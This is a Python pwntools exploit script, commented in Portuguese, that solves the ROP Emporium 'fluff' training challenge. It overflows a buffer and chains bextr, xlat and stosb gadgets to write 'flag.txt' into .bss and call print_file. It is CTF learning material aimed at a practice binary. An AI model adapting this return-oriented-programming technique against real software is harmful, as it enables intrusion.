#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Agraeço ao: https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/fluff/exploit.py
Sem ler o exploit dele não teria conseguido finalizar esse desafio, é bem chatinho a parte dos cálculos e ele faz isso de maneira simples
'''

### IMPORTS ###
from pwn import *

### PREPARATION ###
context(arch='amd64', os='linux', endian='little')
elf = ELF('fluff')
p = process('./fluff')

# Ou:
# elf = context.binary = ELF('fluff')
# p = process(elf.path)

### EXPLAINED, GADGETS AND VARIABLES ###
'''
bextr rbx, rcx, rdx
essa instrução seta o o valor de RBX para X bits (pegados atráves do RCX) do RDX

xlat [rbx]
seta o valor de RBX no RAX

stos [rdi],  al
seta o valor de RAX(1 bytes) no RDI

pop rdi
bom esse é bem simples né? pega o valor do topo da stack e move para rdi 

Então você pode perceber que um registrador leva a outro, veja:
queremos manipular RDI, para isso precisamos manipular RAX
para manipularmos RAX precisamos manipular RBX
e para manipularmos RBX precisamos manipular RCX e RDX

Obs: o uso dos registradores estão conforme na ordem explicados
Eu não te contei uma coisa percebeu:
Como vamos modificar RCX e RDX, bom na função questionableGadgets tem tudo isso eu apenas peguei o endereço de pop rdx até o ret, basicamente isso:
   0x000000000040062a <+2>:     pop    rdx
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret
Olhe o valor da variável bextr
'''

bextr = 0x40062a
xlat = 0x400628
stos = 0x400639
pop_rdi = 0x4006a3

print_file = 0x400510
bss_section = 0x601038

### GET CHARS ###
'''
Vamos trabalhar com bytes já existentes em nosso binário, ou seja, vamos ver aonde podemos encontrar:
byte f
byte l
etc

Vamos encontrar esses bytes lendo o binario em modo bytes e procurar depois

E depois vamos somar com 0x40000 pois esse é o endereço base, ou seja:
endereço base + posição do char = endereço completo do char
Usaremos esse endereço completo para pegarmos apenas o offset, veremos mais tarde
'''

flag = b'flag.txt'
base_addr = 0x400000

# Lendo todos os bytes do arquivo (r - read, b - binary)
with open('fluff', 'rb') as elf:
	data = elf.read()

# Procurando e colocando na lista os endereços dos chars
chars_addr = []
for c in flag:
	chars_addr.append(data.find(c))

# Somando 0x4000 com endereço do char
chars_positions = []
for a in chars_addr:
	char_location = hex(base_addr + a)
	chars_positions.append(char_location)

# Em char_positions vai ter o endereço dos chars, exemplo: 0x403c4 (endereço de 'f')

### EXPLOIT ###
'''
Primeiro vamos estourar o buffer com 40 bytes
Precisamos tomar cuidado com valores que já estão nos registradores
Nesse caso:
RAX tem 0b
E na instrução bextr temos um add rcx, 0x3ef2
Portanto devemos subtrair esses valores para compensar quando forem somados

Precisamos fazer um for com 8 pois é o tamanho da nossa flag.txt
Colocamos o base_adddr mas dessa vez apenas com 3 zeros (0x4000) em RDX
Colocamos 3 zeros apenas porque:
RDX = 0x4000
RCX = 0x4003c4

Em RBX vai ter 0x3c4 já que pegamos 0x4000 de 0x4003c4
Ou seja teremos apenas o offset do char, lembra lá em cima que usariamos o endereço completo para pegar apenas o offset? aqui está

Pegamos o offset do char de acordo com o for, subtraímos rax_value e const_add porque esses valores vão ser somados depois por conta dos valores que já estavam nos registradores
Então em RBX irá ter o offset do char
O xlat irá pegar o valor de RBX e irá colocar em AL
Depois irá pegar o endereço de .bss e somar de acordo com o for pois nesse endereço de bss que podemos escrever nossos chars
Esse endereço de .bss é colocado em RDI

Lembra que em AL tem o offset do nosso char? e em RDI tem o endereço da .bss (seção que podemos escrever)
A stos vai pegar o valor de AL e mover para RDI, juntando assim: bss_section + offset_of_char
Agora temos o char dentro da nossa seção .bss :)

O bss_section é somado de acordo com o for por causa que queremos a cada for escrever nosso char no endereço subsequente de bss
Se não houvesse esse "+ i" ele iria escrever no mesmo lugar de .bss e perderiamos a cada for o endereço do char

Depois disso pegaremos o bss (endereço que contém todos os nossos chars de flag.txt)
E jogaremos de argumento para RDI
Depois chamamos a print_file que pegará o valor de RDI e passará como argumento para função

O rax_value irá ser decrementado toda vez com execeção quando for 0
Pois da primeira vez queremos subtrair o valor que já está em RAX
Da segunda RAX irá ter o endereço do char 'f' dentro de .bss
O flag estará apontando para 1 e sabemos que a lista começa com índice 0
Por isso da segunda vez subtraímos, para apontar para o índice 0
O ord() vai converter 'f' para número inteiro para subtrair
'''

flag_list = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
rax_value = 0xb
const_addr = 0x3ef2

xpl = b''
xpl += b'A' * 40

for i in range(8):
	if(i != 0):
		rax_value = ord(flag_list[i-1])
	xpl += p64(bextr)
	xpl += p64(0x4000) # esse valor vai para rdx
	counts = int(chars_positions[i], 16) - rax_value - const_addr # quando forem somados o valor vai se recuperar
	xpl += p64(counts) # modificamos rbx para o valor resolvido em counts
	xpl += p64(xlat)   # movemos o valor de rbx para rax (mais especificamente al)
	xpl += p64(pop_rdi)
	xpl += p64(bss_section+i)
	xpl += p64(stos)   # pega o valor de al e move para rdi

xpl += p64(pop_rdi)
xpl += p64(bss_section)
xpl += p64(print_file)

### EXECUTE ###
p.sendline(xpl)	# enviando o payload
p.interactive()	# entrando em modo interativo para não ter que ficar recebendo linhas

### SAVING ###
with open('payload', 'wb') as file:
	file.write(xpl)
